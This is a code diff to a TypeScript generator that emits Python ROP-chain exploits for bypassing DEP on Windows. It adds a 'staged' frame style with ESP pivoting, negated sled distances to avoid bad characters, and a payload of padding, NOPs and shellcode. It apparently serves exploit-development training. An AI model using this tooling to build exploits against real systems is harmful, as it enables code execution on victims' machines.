@@ -5,7 +5,7 @@ import { RopGadget } from "../rop/types";
 import { buildRopIndexFromRpPlusText } from "../rop";
 import { MAX_HOPS, Path, ReachIndex, Reg, Unreached, Val, constVal, describe, effectOf, isPath } from "../rop/reach";
 import { copyBytes, FRAMES, FrameFacts, frameGoal, PUSHAD_FRAMES, PUSHAD_TAIL, Slot, WPM_MIN_COPY } from "./dep_frames";
-import { DepPlanStyle, JobPlan, LARGE_STACK_MOVE, Verdict, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, stackMove, writtenRegisters } from "./dep_plan";
+import { DepPlanStyle, JobPlan, LARGE_STACK_MOVE, Verdict, fieldRegister, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, stackMove, writtenRegisters } from "./dep_plan";
 import { DepApi } from "./rop_template";
 
 // One row per gadget the chain uses. Every block is a rendering of this table.
@@ -69,6 +69,10 @@ export type BuildInput = {
   cave?: number;
   /** How many bytes the cave holds, which is how many WriteProcessMemory may copy into it. */
   caveBytes?: number;
+  /** The staged style only: writable module bytes the frame is laid in, 4 per slot, with every field
+   * address free of the bad chars because the chain pops each one. Absent means the style is not
+   * available and nothing chose it. */
+  staging?: number;
   jmpEsp?: number;
   /** The next free payloadN() in the student's file. A block whose content is a sendable payload arrives
    * as that complete function, so his file grows by appending and every function is one thing he sends. */
@@ -117,8 +121,9 @@ export function extraPops(gadget: RopGadget, loads: number): number {
   return Math.max(0, pops - loads);
 }
 
-// pops after the gadget moved ESP eat dwords on the new stack, before its ret.
-function popsAfterPivot(gadget: RopGadget): number {
+/** Pops after the gadget moved ESP: they eat dwords on the new stack, before its ret, so the register
+ * the pivot takes ESP from has to point that many dwords below the frame's first field. */
+export function popsAfterPivot(gadget: RopGadget): number {
   let moved = false;
   let pops = 0;
   for (const instruction of gadget.instructions) {
@@ -223,6 +228,11 @@ export function buildExploit(input: BuildInput): Build {
   const JUNK = filler(badchars);
   const gap = input.landing?.gap ?? 0;
   const retGap = `RET_GAP = ${gap}${" ".repeat(Math.max(1, 25 - String(gap).length))}# ${input.landing?.how ?? "not measured: assumed 0, a plain ret"}`;
+  // STAGING plus an offset, as the chain's own text. The frame's base is a name the copy block defines,
+  // so a reader sees which field each popped dword is instead of subtracting the write gadget's
+  // displacement from a literal by hand.
+  const stagingText = (offset: number): string =>
+    offset === 0 ? "STAGING" : `STAGING ${offset < 0 ? "-" : "+"} 0x${Math.abs(offset).toString(16).toUpperCase()}`;
   const table: Entry[] = [];
   const holes: string[] = [];
   const byAddress: Record<number, RopGadget> = {};
@@ -536,12 +546,12 @@ export function buildExploit(input: BuildInput): Build {
   const advance = pick("advance");
   const negate = pick("negate");
   const pivot = pick("pivot");
-  const field = copy?.at.dest ?? copyPath?.to ?? "";
+  const field = fieldRegister(input.plans) ?? "";
   const valueRegister = write?.at.source ?? "eax";
   const writeOffset = write?.at.offset ?? 0;
 
   // register += a distance popped into another register that `keep` does not need.
-  const arithmetic = (register: string, keep: string[]): { pop: Entry; op: Entry; sub: boolean } | undefined => {
+  const arithmetic = (register: string, keep: string[]): { pop: Entry; op: Entry; by: string; sub: boolean } | undefined => {
     for (const kind of ["REGISTER_SUB", "REGISTER_ADD"]) {
       const options = near(rankCandidates(gadgets.filter((gadget) => gadget.capabilities.some((capability) =>
         capability.kind === kind && capability.register === register && REGISTERS.indexOf(capability.targetRegister ?? "") >= 0
@@ -550,10 +560,35 @@ export function buildExploit(input: BuildInput): Build {
       for (const gadget of options) {
         const by = gadget.capabilities.filter((capability) => capability.kind === kind && capability.register === register)[0].targetRegister ?? "";
         const pop = popGadget(by, keep.concat(register));
-        if (pop) return { pop: entry(pop, `load ${by}`, 1), op: entry(gadget, kind === "REGISTER_SUB" ? "subtract a distance" : "add a distance"), sub: kind === "REGISTER_SUB" };
+        if (pop) return { pop: entry(pop, `load ${by}`, 1), op: entry(gadget, kind === "REGISTER_SUB" ? "subtract a distance" : "add a distance"), by, sub: kind === "REGISTER_SUB" };
       }
     }
     return undefined;
+  };
+
+  // A negate of one register whose instruction is the gadget's first, so it negates the value it was
+  // handed rather than something an instruction before it left there.
+  const negateGadget = (register: string, keep: string[]): RopGadget | undefined =>
+    near(rankCandidates(gadgets.filter((gadget) => {
+      const capability = gadget.capabilities.filter((cap) => cap.kind === "REGISTER_NEGATE" && cap.register === register)[0];
+      return capability !== undefined && capability.evidence[0] === gadget.instructions[0]?.normalizedText
+        && usable(gadget, keep, [register]);
+    })))[0];
+
+  /** `register += the distance to the shellcode`, where the script chooses the dword once the chain is
+   * laid out. The sled is a few hundred bytes up the stack, so the distance itself is 0x000001xx and a
+   * target with 00 among its bad chars cannot send it; what it can send is neg(distance), 0xFFFFFExx. A
+   * sub consumes that one as it is, and an add consumes it after a negate of the same register, so the
+   * sign the script sends is this choice and `negated` is what [7/7]'s to_sled then returns. */
+  const sledOps = (register: string, keep: string[]): { ops: Op[]; negated: boolean } | undefined => {
+    const math = arithmetic(register, keep);
+    if (!math) return undefined;
+    const sendable = (negated: boolean): boolean => negated || badchars.indexOf(0) < 0;
+    const pop: Op = { call: math.pop, values: [computed("0")], note: `${math.by} = the distance to the NOPs, patched below` };
+    if (sendable(math.sub)) return { ops: [pop, { call: math.op, values: [] }], negated: math.sub };
+    const flip = negateGadget(math.by, keep.concat(register));
+    if (!flip) return undefined;
+    return { ops: [pop, { call: entry(flip, `negate the distance`), values: [] }, { call: math.op, values: [] }], negated: !math.sub };
   };
 
   // The ops that leave a slot's value in `register`. Both styles use this one loader.
@@ -604,6 +639,36 @@ export function buildExploit(input: BuildInput): Build {
         ];
       }
       case "shellcode": {
+        if (style === "staged") {
+          // A staged frame holds constants but for this one dword: the shellcode is in the payload, so
+          // its address is the captured ESP plus a distance only the laid-out chain knows. The capture
+          // runs inside this loader, because `here` has to name the chain dword ESP will be pointing at
+          // when it does, and the patched dword is the one popped straight after.
+          if (!capture) return missing(`no gadget captures ESP in ${input.module}: see [4/7]`);
+          const from = capture.at.dest ?? "";
+          const route = [from, ...REGISTERS.filter((r) => r !== from && keep.indexOf(r) < 0)].map((at) => {
+            const there = moveOps(from, at, keep);
+            const sled = there ? sledOps(at, keep) : undefined;
+            const back = sled ? moveOps(at, register, keep) : undefined;
+            return there && sled && back ? { there, sled, back } : undefined;
+          }).filter((found) => found !== undefined)[0];
+          if (!route) {
+            return missing(`no register takes the captured ESP out of ${from} and a distance onto it: the shellcode's address\n`
+              + `is ESP plus a few hundred bytes, so this needs an add or a sub whose distance the chain can send, and\n`
+              + `the chain can only send it negated while 00 is a bad char: dx @$osed().palette("${input.module}", "${badSpaced}")`);
+          }
+          sledSub = route.sled.negated;
+          say(register, slot.name, "the captured ESP plus a distance", `capture ESP, then ${route.sled.negated ? "sub" : "add"} the distance the script patches below`,
+            `the captured ESP plus the distance to the NOPs`);
+          return [
+            { line: `here = len(c) + 1 + c.skip // 4     # ${from} = the address of this chain dword` },
+            { call: entry(capture.gadget, "capture ESP"), values: [] },
+            ...route.there,
+            { line: "c.patches.append((len(c) + 1 + c.skip // 4, here))" },
+            ...route.sled.ops,
+            ...route.back,
+          ];
+        }
         // The field address plus the distance to the sled, worked out in `register` itself or, when it has
         // no sub, in any register that has one and can hand the result over.
         const via = [register, ...REGISTERS.filter((r) => r !== register && keep.indexOf(r) < 0)].map((at) => {
@@ -635,7 +700,10 @@ export function buildExploit(input: BuildInput): Build {
   const loaders: Op[] = [];
   const defineLoader = (slot: Slot, register: string, keep: string[]): string => {
     const fn = `load_${ident(slot.name)}`;
-    const params = slot.source.kind === "shellcode" ? "c, field" : slot.source.kind === "size" ? "c, size" : "c";
+    // A staged frame's shellcode slot needs no field number: its value is measured from the captured
+    // ESP, not from the field it is written into.
+    const params = slot.source.kind === "shellcode" && style !== "staged" ? "c, field"
+      : slot.source.kind === "size" ? "c, size" : "c";
     loaders.push({ line: `def ${fn}(${params}):${" ".repeat(Math.max(1, 34 - fn.length - params.length))}# ${register} = ${slot.name}` });
     const holesBefore = holes.length;
     for (const op of load(slot, register, keep)) loaders.push("call" in op ? op : { line: op.line });
@@ -745,6 +813,76 @@ export function buildExploit(input: BuildInput): Build {
         { line: "payload += PAD * gap + nops + shellcode" },
       );
     }
+  } else if (style === "staged") {
+    // The frame is laid at a fixed writable address in the module, so the payload carries no frame at
+    // all and every field's address is a constant the chain pops. Each field is one group: the value
+    // into the write's value register keeping nothing, then that field's address into the write's
+    // address register keeping the value, then the write. Nothing is carried from one field to the
+    // next, which is why a module that cannot copy a register at all still takes this style.
+    const frame = FRAMES[api];
+    const staging = input.staging;
+    const span = 4 * frame.length;
+    const addrRegister = write?.at.address ?? "";
+    frameBlock = staging === undefined ? [] : [
+      `STAGING = ${hex(staging)}      # the frame is laid here: ${span} writable bytes in ${input.module}`,
+      ...frame.map((slot, i) => `#   ${stagingText(4 * i).padEnd(22)}${slot.name}${i === 0 ? "   <- the pivot's ret enters the call here" : ""}`),
+      retGap,
+    ];
+    if (staging === undefined || !write || !pivot) {
+      chain.push(...hole("payload", staging === undefined
+        ? `no run of ${span} writable bytes in ${input.module} with every field address free of the bad chars: the chain pops each one\ndx @$osed().code_caves("", ${hex(span)}, 25, "${badSpaced}", "STAGING")`
+        : "[4/7] has no exact pick for write or pivot: write this chain and its payload by hand"));
+    } else {
+      const fns = frame.map((slot) => defineLoader(slot, valueRegister, []));
+      // Keyed by the gadgets, so two fields that took the same route are seen to have taken it: the
+      // names are per-call reference tokens and two of them differ even for one gadget.
+      const addresses: Array<{ names: string[]; key: string }> = [];
+      frame.forEach((slot, i) => {
+        chain.push(group(`field ${i + 1}: ${slot.name}`));
+        if (briefs[fns[i]]) chain.push({ line: `# ${briefs[fns[i]]}` });
+        chain.push({ line: `${fns[i]}(${slot.source.kind === "size" ? "c, size" : "c"})` });
+        const goal = constVal((staging + 4 * i - writeOffset) >>> 0, stagingText(4 * i - writeOffset));
+        const found = reachPath(addrRegister, goal, [valueRegister]);
+        if (!isPath(found)) chain.push(...hole(`field${i + 1}_address`, unreachable(addrRegister, goal, [valueRegister], `field ${i + 1}`, found).full));
+        else {
+          const walked = walk(addrRegister, goal, `field ${i + 1}`, found);
+          addresses.push({ names: walked.names, key: found.hops.map((hop) => gadgetAddress(hop.gadget)).join() });
+          chain.push(...walked.ops);
+        }
+        chain.push({ call: entry(write.gadget, "write the field"), values: [] });
+      });
+      // One route line for the whole set, not one per field: they differ only in the constant, and a
+      // constant is what a staged frame's field addresses are. Each is searched separately all the same,
+      // because a bad byte in one of them can cost it a gadget its neighbour did not need.
+      if (addresses.length > 0) {
+        const distinct = addresses.filter((entry, i) => addresses.findIndex((other) => other.key === entry.key) === i);
+        const route = distinct.length === 1 ? `${distinct[0].names.join(" -> ")}, the same route for all ${addresses.length}`
+          : distinct.map((entry) => entry.names.join(" -> ")).join(", or ");
+        routes.push(`${addrRegister} = each field address: ${route}. ${frame.length} constants, ${stagingText(-writeOffset)} to ${stagingText(span - 4 - writeOffset)}`);
+      }
+      const pops = popsAfterPivot(pivot.gadget);
+      const target = pivot.at.source ?? "";
+      chain.push(group("pivot: ESP onto the frame"));
+      chain.push({ line: `# ${target} = ${stagingText(-4 * pops)}, so the ret after the pivot lands on field 1` });
+      const pivotOps = reachOps(target, constVal((staging - 4 * pops) >>> 0, stagingText(-4 * pops)), [], "the pivot");
+      chain.push(..."missing" in pivotOps ? hole("pivot_value", pivotOps.missing) : pivotOps);
+      chain.push({ call: entry(pivot.gadget, "pivot ESP onto the frame"), values: [] });
+      chain.push(
+        { line: "" },
+        group("the shellcode address, into the slot the loader marked"),
+        { line: `def to_sled(here, gap):        # what the pop before the ${sledSub ? "sub" : "add"} needs, so the value lands on the NOPs` },
+        { line: "    distance = 4 * (len(c) - here) + gap" },
+        { line: `    return ${sledSub ? "neg(distance)" : "distance"}` },
+        { line: "gap = 0x40" },
+        { line: "while not all(clean(to_sled(h, gap)) for _, h in c.patches):" },
+        { line: "    gap += 1" },
+        { line: "    if gap > 0x1000: hole(\"a distance to the sled that holds no bad char\")" },
+        { line: "for at, h in c.patches: c[at] = to_sled(h, gap)" },
+        { line: "" },
+        { line: "payload  = PAD * OFFSET + b\"\".join(p32(w) for w in c)" },
+        { line: "payload += PAD * gap + nops + shellcode" },
+      );
+    }
   } else {
     // Each loaded register is kept by every load after it, so a register blocked only by what the ones
     // before it hold is reachable if it goes first. Such a register moves to the front and the order is
@@ -826,7 +964,9 @@ export function buildExploit(input: BuildInput): Build {
   const width = Math.max(0, ...table.map((entry) => entry.name.length));
   const cost = table.filter((entry) => entry.pops > 0 || entry.retn > 0);
   const badText = badchars.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("");
-  const sized = style === "skeleton" && FRAMES[api].some((slot) => slot.source.kind === "size");
+  // PUSHAD takes dwSize as a constant in a register; both styles that write the frame take it from the
+  // script, which grows it until its negative holds no bad char.
+  const sized = style !== "pushad" && FRAMES[api].some((slot) => slot.source.kind === "size");
   const slot = slotBlock(api, input.module, input.iatSlot, badchars, input.delta);
   const stageLines = [
     `def payload${nextStage()}():`,
